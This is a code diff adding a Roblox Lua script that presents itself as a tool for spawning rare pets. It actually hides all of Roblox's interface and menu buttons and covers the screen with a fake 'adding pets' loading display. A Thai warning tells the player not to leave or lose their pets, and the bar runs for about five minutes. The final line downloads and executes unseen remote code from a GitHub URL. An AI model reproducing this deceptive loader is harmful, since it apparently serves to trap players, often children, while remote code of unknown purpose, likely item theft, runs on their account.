@@ -1,0 +1,140 @@
+repeat wait() until game:IsLoaded()
+repeat wait() until game.Players.LocalPlayer
+
+local player = game.Players.LocalPlayer
+local StarterGui = game:GetService("StarterGui")
+
+-- ปิดทุก UI จาก Roblox
+pcall(function()
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    StarterGui:SetCore("TopbarEnabled", false)
+end)
+
+-- ซ่อนปุ่มเมนูบนมือถือด้วย
+if player:FindFirstChild("PlayerGui") then
+    local menuButton = player.PlayerGui:FindFirstChild("MenuButton")
+    if menuButton then
+        menuButton:Destroy()
+    end
+end
+
+-- สร้าง GUI โหลด
+local gui = Instance.new("ScreenGui")
+gui.Name = "LoadingUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 9999
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- พื้นหลังดำสนิท
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+
+-- ป้ายเตือน
+local warn = Instance.new("TextLabel", gui)
+warn.Text = "⚠️ ห้ามออกเด็ดขาด   ไม่งั้นสัตว์หาย ⚠️"
+warn.Size = UDim2.new(1, 0, 0, 60)
+warn.Position = UDim2.new(0.5, 0, 0.08, 0)
+warn.AnchorPoint = Vector2.new(0.5, 0.5)
+warn.Font = Enum.Font.GothamBold
+warn.TextSize = 40
+warn.TextColor3 = Color3.fromRGB(255, 180, 0)
+warn.BackgroundTransparency = 1
+
+-- ข้อความชื่อผู้เล่น
+local nameText = Instance.new("TextLabel", gui)
+nameText.Text = "กำลังโหลดสคริปสำหรับ: " .. player.Name
+nameText.Size = UDim2.new(1, 0, 0, 50)
+nameText.Position = UDim2.new(0.5, 0, 0.3, 0)
+nameText.AnchorPoint = Vector2.new(0.5, 0.5)
+nameText.Font = Enum.Font.FredokaOne
+nameText.TextSize = 36
+nameText.TextColor3 = Color3.fromRGB(255, 255, 80)
+nameText.BackgroundTransparency = 1
+
+-- ข้อความเปลี่ยนชื่อสัตว์
+local animals = { "Blood Owl", "Raccoon", "Night Owl", "Fennec Fox", "T-Rex", "Queen Bee", "Disco Bee", "Red Fox", "Dragonfly" }
+local animalText = Instance.new("TextLabel", gui)
+animalText.Size = UDim2.new(1, 0, 0, 40)
+animalText.Position = UDim2.new(0.5, 0, 0.45, 0)
+animalText.AnchorPoint = Vector2.new(0.5, 0.5)
+animalText.Font = Enum.Font.FredokaOne
+animalText.TextSize = 28
+animalText.TextColor3 = Color3.fromRGB(255, 200, 0)
+animalText.BackgroundTransparency = 1
+animalText.Text = ""
+
+task.spawn(function()
+	while true do
+		for _, name in ipairs(animals) do
+			animalText.Text = "กำลังเพิ่มสัตว์: " .. name
+			animalText.TextColor3 = Color3.fromHSV(math.random(), 1, 1)
+			wait(0.9)
+		end
+	end
+end)
+
+-- แถบโหลด
+local bar = Instance.new("Frame", gui)
+bar.Size = UDim2.new(0.6, 0, 0.035, 0)
+bar.Position = UDim2.new(0.5, 0, 0.65, 0)
+bar.AnchorPoint = Vector2.new(0.5, 0.5)
+bar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+bar.BorderSizePixel = 0
+
+local left = Instance.new("Frame", bar)
+left.Size = UDim2.new(0, 0, 1, 0)
+left.Position = UDim2.new(0.5, 0, 0, 0)
+left.AnchorPoint = Vector2.new(1, 0)
+left.BorderSizePixel = 0
+left.BackgroundColor3 = Color3.fromRGB(0, 255, 120)
+
+local right = Instance.new("Frame", bar)
+right.Size = UDim2.new(0, 0, 1, 0)
+right.Position = UDim2.new(0.5, 0, 0, 0)
+right.AnchorPoint = Vector2.new(0, 0)
+right.BorderSizePixel = 0
+right.BackgroundColor3 = Color3.fromRGB(0, 255, 120)
+
+-- อิโมจิพืชลอย ๆ
+task.spawn(function()
+	while true do
+		local emoji = Instance.new("TextLabel")
+		emoji.Text = "🌿"
+		emoji.Font = Enum.Font.SourceSansBold
+		emoji.TextSize = math.random(14, 28)
+		emoji.TextTransparency = 0
+		emoji.BackgroundTransparency = 1
+		emoji.TextColor3 = Color3.fromHSV(math.random(), 0.8, 1)
+		emoji.Size = UDim2.new(0, 50, 0, 50)
+		emoji.Position = UDim2.new(math.random(), 0, 1, 0)
+		emoji.Parent = gui
+
+		local tweenInfo = TweenInfo.new(math.random(4, 7), Enum.EasingStyle.Linear)
+		local goal = { Position = UDim2.new(math.random(), 0, -0.1, 0) }
+		game:GetService("TweenService"):Create(emoji, tweenInfo, goal):Play()
+
+		game.Debris:AddItem(emoji, 8)
+		wait(0.25)
+	end
+end)
+
+-- จำลองการโหลด 100%
+task.spawn(function()
+	for i = 1, 100 do
+		local percent = i / 100 * 0.5
+		left.Size = UDim2.new(percent, 0, 1, 0)
+		right.Size = UDim2.new(percent, 0, 1, 0)
+		wait(3) -- โหลดนานขึ้นถ้าต้องการ
+	end
+	gui:Destroy()
+
+	-- เปิด UI ปกติกลับมา
+	pcall(function()
+		StarterGui:SetCore("TopbarEnabled", true)
+		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+	end)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/haicryy001445/haihub/refs/heads/main/b0233e1e9408d84e00c6a60960492931.txt"))()
